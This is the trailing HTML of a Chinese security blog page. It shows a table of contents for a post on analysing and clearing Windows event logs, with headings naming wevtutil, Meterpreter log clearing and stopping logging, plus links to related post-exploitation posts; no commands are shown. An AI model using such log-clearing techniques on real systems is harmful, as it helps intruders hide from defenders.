href="http://blog.xchstudy.org/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/1%20windows%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/">http://blog.xchstudy.org/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/1%20windows%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.xchstudy.org" target="_blank">小chen妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://pic.chenjichao.site/raw/3.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/2%20Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/" title="Linux痕迹清除"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/13.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linux痕迹清除</div></div></a></div><div class="next-post pull-right"><a href="/2026/04/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/02%20%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8/1%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/%E5%8D%8F%E8%AE%AE%E7%88%86%E7%A0%B4/" title="协议爆破"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/6.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">协议爆破</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">chen7chen</div><div class="author-info__description">个人心得，学习分享</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">218</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">151</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cjc0729"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cjc0729" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:chenjichao729@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center> <b> 学习使用，师傅勿喷(#／。＼#)； <br><br> 功能、内容尚未完全，网站还会持续更新优化哦(*´∀`)~♥ <br><br> 电影网站需要认证才能进入哦，如有需要，请联系本人。 声明：本人搭建所有网站均无商业用途。 </b> </center></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97"><span class="toc-number">1.</span> <span class="toc-text">Windows日志</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">系统日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.2.</span> <span class="toc-text">应用程序日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.3.</span> <span class="toc-text">安全日志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.</span> <span class="toc-text">查看系统日志</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">Powershell获取日志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E6%A0%B8%E7%AD%96%E7%95%A5%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">审核策略与事件查看器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%99%BB%E5%BD%95%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">常见登录事件日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">登录类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E6%AE%B5"><span class="toc-number">1.4.2.</span> <span class="toc-text">特殊字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5"><span class="toc-number">1.5.</span> <span class="toc-text">常见情况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E7%89%A9%E7%90%86%E6%9C%BA%E5%99%A8%E7%99%BB%E5%BD%95%EF%BC%88%E6%89%93%E5%8D%A1%E4%B8%8A%E7%8F%AD-%E6%8E%A5%E8%A7%A6%E7%89%A9%E7%90%86%E6%9C%BA%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 本地物理机器登录（打卡上班 &#x2F; 接触物理机）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87-RDP-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%EF%BC%88%E8%BF%9C%E7%A8%8B%E5%8A%9E%E5%85%AC-%E5%A4%96%E9%83%A8%E5%85%A5%E4%BE%B5%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 通过 RDP 远程桌面连接（远程办公 &#x2F; 外部入侵）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95-%E6%89%A7%E8%A1%8C-PsExec%EF%BC%88%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%89"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. 访问网络共享目录 &#x2F; 执行 PsExec（内网横向移动）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%94%81%E5%B1%8F%E4%B8%8E%E8%A7%A3%E9%94%81%EF%BC%88%E7%9F%AD%E6%9A%82%E7%A6%BB%E5%BC%80%E5%BA%A7%E4%BD%8D%EF%BC%89"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. 锁屏与解锁（短暂离开座位）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E8%BF%90%E8%A1%8C-UAC-%E6%8F%90%E6%9D%83%EF%BC%88RunAs-%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%89"><span class="toc-number">1.5.5.</span> <span class="toc-text">5. 以其他用户身份运行 &#x2F; UAC 提权（RunAs &#x2F; 凭据窃取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8%EF%BC%88%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8%EF%BC%89"><span class="toc-number">1.5.6.</span> <span class="toc-text">6. 系统服务与计划任务自动启动（持久化后门）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.</span> <span class="toc-text">过滤信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E4%BD%BF%E7%94%A8-XML-%E7%AD%9B%E9%80%89%E5%99%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">一、 如何在 Windows 中使用 XML 筛选器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E6%A0%B8%E5%BF%83-XML-%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90"><span class="toc-number">1.6.2.</span> <span class="toc-text">二、 核心 XML 语法解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E5%AE%9E%E6%88%98%E9%AB%98%E9%A2%91-XML-%E7%AD%9B%E9%80%89%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.6.3.</span> <span class="toc-text">三、 实战高频 XML 筛选模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AD%9B%E9%80%89%E7%89%B9%E5%AE%9A%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%99%BB%E5%BD%95%EF%BC%88%E4%BE%8B%E5%A6%82%EF%BC%9A%E4%BB%85%E6%9F%A5%E7%9C%8B-RDP-%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">1. 筛选特定类型的登录（例如：仅查看 RDP 远程登录）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%AD%9B%E9%80%89%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BF%BD%E8%B8%AA%E9%92%88%E5%AF%B9%E6%80%A7%E7%88%86%E7%A0%B4%EF%BC%89"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">2. 筛选特定用户的登录失败记录（追踪针对性爆破）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%AD%9B%E9%80%89%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E6%8C%87%E5%AE%9A-IP-%E7%9A%84%E7%BD%91%E7%BB%9C%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">3. 筛选内网横向移动（指定 IP 的网络登录）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%AD%9B%E9%80%89%E2%80%9C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E2%80%9D%E7%89%B9%E5%BE%81-Pass-the-Hash"><span class="toc-number">1.6.3.4.</span> <span class="toc-text">4. 筛选“哈希传递攻击”特征 (Pass-the-Hash)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E6%83%B3%E8%A6%81%E8%BF%87%E6%BB%A4%E7%9A%84-XML-%E5%8F%82%E6%95%B0%EF%BC%9F"><span class="toc-number">1.6.4.</span> <span class="toc-text">四、 如何自己构造想要过滤的 XML 参数？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">1.7.</span> <span class="toc-text">日志分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log-Parser"><span class="toc-number">1.7.1.</span> <span class="toc-text">Log Parser</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">一、 核心命令语法结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E5%B8%B8%E7%94%A8%E7%9A%84%E8%BE%93%E5%85%A5%E6%A8%A1%E5%9D%97-i"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">二、 常用的输入模块 (-i)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E5%B8%B8%E7%94%A8%E7%9A%84%E8%BE%93%E5%87%BA%E6%A8%A1%E5%9D%97-o"><span class="toc-number">1.7.1.3.</span> <span class="toc-text">三、 常用的输出模块 (-o)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E5%85%B3%E9%94%AE%E7%9A%84%E5%85%A8%E5%B1%80%E5%8F%82%E6%95%B0%E4%B8%8E%E6%8E%A7%E5%88%B6%E9%80%89%E9%A1%B9"><span class="toc-number">1.7.1.4.</span> <span class="toc-text">四、 关键的全局参数与控制选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81-%E5%AE%9E%E6%88%98%E5%8F%96%E8%AF%81%E6%9F%A5%E8%AF%A2%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.7.1.5.</span> <span class="toc-text">五、 实战取证查询示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%84%B1%E6%9C%BA%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6-Offline-EVTX-%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E8%AE%B0%E5%BD%95"><span class="toc-number">1.7.1.5.1.</span> <span class="toc-text">查询脱机日志文件 (Offline EVTX) 中的登录失败记录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%9F%E8%AE%A1-IIS-%E6%97%A5%E5%BF%97%E4%B8%AD%E8%AE%BF%E9%97%AE%E9%87%8F%E6%9C%80%E9%AB%98%E7%9A%84%E5%89%8D-10-%E4%B8%AA-IP%EF%BC%88%E6%8E%92%E6%9F%A5-Web-%E6%89%AB%E6%8F%8F%E6%88%96-CC-%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.7.1.5.2.</span> <span class="toc-text">统计 IIS 日志中访问量最高的前 10 个 IP（排查 Web 扫描或 CC 攻击）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97%E5%AF%BB%E6%89%BE-C-%E7%9B%98%E6%9C%80%E8%BF%91-24-%E5%B0%8F%E6%97%B6%E5%86%85%E8%A2%AB%E4%BF%AE%E6%94%B9%E8%BF%87%E7%9A%84-exe-%E6%88%96-dll-%E6%96%87%E4%BB%B6%EF%BC%88%E5%AF%BB%E6%89%BE%E8%90%BD%E5%9C%B0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%EF%BC%89"><span class="toc-number">1.7.1.5.3.</span> <span class="toc-text">利用文件系统模块寻找 C 盘最近 24 小时内被修改过的 .exe 或 .dll 文件（寻找落地的恶意程序）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.7.1.5.4.</span> <span class="toc-text">查询登录成功的事件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.7.1.5.5.</span> <span class="toc-text">查询登录失败的事件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%9F%E8%AE%A1%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E4%B8%AD%E5%90%84-Event-ID-%E7%9A%84%E5%87%BA%E7%8E%B0%E9%A2%91%E7%8E%87"><span class="toc-number">1.7.1.5.6.</span> <span class="toc-text">统计系统日志中各 Event ID 的出现频率</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Event-Log-Explorer"><span class="toc-number">1.7.2.</span> <span class="toc-text">Event Log Explorer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4"><span class="toc-number">2.</span> <span class="toc-text">Windows日志清除</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wevtutil%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">wevtutil日志清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">核心参数解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86%E5%91%BD%E4%BB%A4%E5%AE%8C%E5%96%84"><span class="toc-number">2.1.2.</span> <span class="toc-text">日志清理命令完善</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97"><span class="toc-number">2.2.</span> <span class="toc-text">Meterpreter清理日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="toc-number">2.3.</span> <span class="toc-text">停止日志记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EventLogMaster"><span class="toc-number">2.4.</span> <span class="toc-text">EventLogMaster</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/2%20%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2%20%E6%B5%81%E9%87%8F%E7%A7%8D%E7%B1%BB/" title="流量种类">流量种类</a><time datetime="2026-04-05T16:00:00.000Z" title="发表于 2026-04-06 00:00:00">2026-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/2%20%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1%20%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/" title="流量分析基础——网络模型">流量分析基础——网络模型</a><time datetime="2026-04-05T16:00:00.000Z" title="发表于 2026-04-06 00:00:00">2026-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/05%20%E5%89%8D%E6%B2%BF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F/AI%E5%AE%89%E5%85%A8/2%20%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88/" title="攻击检测方案">攻击检测方案</a><time datetime="2026-04-04T16:00:00.000Z" title="发表于 2026-04-05 00:00:00">2026-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/1%20%E5%85%8D%E6%9D%80/1%20%E5%85%8D%E6%9D%80/1%20%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title="免杀工具的使用">免杀工具的使用</a><time datetime="2026-04-04T16:00:00.000Z" title="发表于 2026-04-05 00:00:00">2026-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/2%20Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/" title="Linux痕迹清除">Linux痕迹清除</a><time datetime="2026-04-02T16:00:00.000Z" title="发表于 2026-04-03 00:00:00">2026-04-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By chen7chen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
